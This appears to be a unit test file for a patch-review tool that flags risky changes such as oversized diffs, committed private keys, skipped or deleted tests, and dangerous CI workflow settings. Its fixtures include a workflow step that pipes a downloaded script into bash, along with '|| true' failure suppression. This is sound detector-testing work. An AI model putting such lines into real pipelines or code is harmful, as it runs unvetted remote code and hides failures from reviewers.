from __future__ import annotations

from pathlib import Path
import tempfile
import unittest

from patchlab.checks import CheckContext, run_checks
from patchlab.config import PatchLabConfig, PolicyConfig, ScopeConfig
from patchlab.diffparse import parse_unified_diff
from patchlab.gitutils import GitRepo
from patchlab.models import ChangedFile, Disposition
from tests.helpers import commit_all, init_repo


class ExtendedPolicyCheckTests(unittest.TestCase):
    def context(
        self,
        diff: str,
        files: tuple[ChangedFile, ...],
        *,
        scope: ScopeConfig | None = None,
        policy: PolicyConfig | None = None,
    ) -> CheckContext:
        repo_path = Path(tempfile.mkdtemp()) / "repo"
        init_repo(repo_path)
        (repo_path / "seed").write_text("seed", encoding="utf-8")
        sha = commit_all(repo_path, "seed")
        return CheckContext(
            PatchLabConfig(
                project_name="checks",
                scope=scope or ScopeConfig(allow=("**",)),
                policy=policy or PolicyConfig(),
            ),
            GitRepo(repo_path),
            sha,
            sha,
            files,
            tuple(parse_unified_diff(diff)),
        )

    def test_scope_limits_binary_and_generated(self) -> None:
        files = (
            ChangedFile("A", "dist/app.min.js", added_lines=20, deleted_lines=0),
            ChangedFile("A", "asset.bin", added_lines=None, deleted_lines=None, binary=True),
        )
        context = self.context(
            "",
            files,
            scope=ScopeConfig(allow=("**",), max_files=1, max_added_lines=10, max_deleted_lines=1),
        )
        ids = {finding.rule_id for finding in run_checks(context)}
        self.assertTrue({"PL-SCOPE-001", "PL-SCOPE-002", "PL-SCOPE-005", "PL-SCOPE-006"} <= ids)

    def test_deleted_line_limit(self) -> None:
        context = self.context(
            "",
            (ChangedFile("M", "src/app.py", added_lines=0, deleted_lines=4),),
            scope=ScopeConfig(allow=("**",), max_deleted_lines=3),
        )
        self.assertIn("PL-SCOPE-003", {item.rule_id for item in run_checks(context)})

    def test_private_key_and_hardcoded_secret(self) -> None:
        diff = """diff --git a/config.py b/config.py
--- a/config.py
+++ b/config.py
@@ -0,0 +1,2 @@
+private_key = "abcdefghijklmnopqrstuvwxyz1234567890"
+-----BEGIN PRIVATE KEY-----
"""
        files = (ChangedFile("A", "config.py", added_lines=2, deleted_lines=0),)
        ids = {item.rule_id for item in run_checks(self.context(diff, files))}
        self.assertIn("PL-SECRET-002", ids)
        self.assertIn("PL-SECRET-004", ids)

    def test_sensitive_file_path(self) -> None:
        files = (ChangedFile("A", "certs/service.pem", added_lines=1, deleted_lines=0),)
        self.assertIn("PL-SECRET-001", {item.rule_id for item in run_checks(self.context("", files))})

    def test_workflow_risk_patterns(self) -> None:
        diff = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1,6 @@
 steps:
+  persist-credentials: true
+  continue-on-error: true
+  run: curl https://example.invalid/install.sh | bash
+  - uses: ./local-action
+  - uses: docker://alpine:3
"""
        files = (ChangedFile("M", ".github/workflows/ci.yml", added_lines=5, deleted_lines=0),)
        ids = {item.rule_id for item in run_checks(self.context(diff, files))}
        self.assertTrue({"PL-GHA-004", "PL-GHA-005", "PL-GHA-006"} <= ids)
        self.assertNotIn("PL-GHA-007", ids)

    def test_test_deletion_skip_and_failure_suppression(self) -> None:
        diff = """diff --git a/tests/test_app.py b/tests/test_app.py
--- a/tests/test_app.py
+++ b/tests/test_app.py
@@ -1 +1,2 @@
 pass
+@unittest.skip("later")
+command || true
"""
        files = (
            ChangedFile("D", "tests/test_old.py", added_lines=0, deleted_lines=4),
            ChangedFile("M", "tests/test_app.py", added_lines=2, deleted_lines=0),
        )
        ids = {item.rule_id for item in run_checks(self.context(diff, files))}
        self.assertTrue({"PL-TEST-001", "PL-TEST-003", "PL-TEST-004"} <= ids)

    def test_allow_disposition_produces_info(self) -> None:
        policy = PolicyConfig(network_additions=Disposition.ALLOW)
        diff = """diff --git a/app.py b/app.py
--- a/app.py
+++ b/app.py
@@ -0,0 +1 @@
+requests.get("https://example.invalid")
"""
        findings = run_checks(
            self.context(diff, (ChangedFile("A", "app.py", added_lines=1, deleted_lines=0),), policy=policy)
        )
        network = next(item for item in findings if item.rule_id == "PL-NET-001")
        self.assertEqual(network.disposition, Disposition.ALLOW)


if __name__ == "__main__":
    unittest.main()
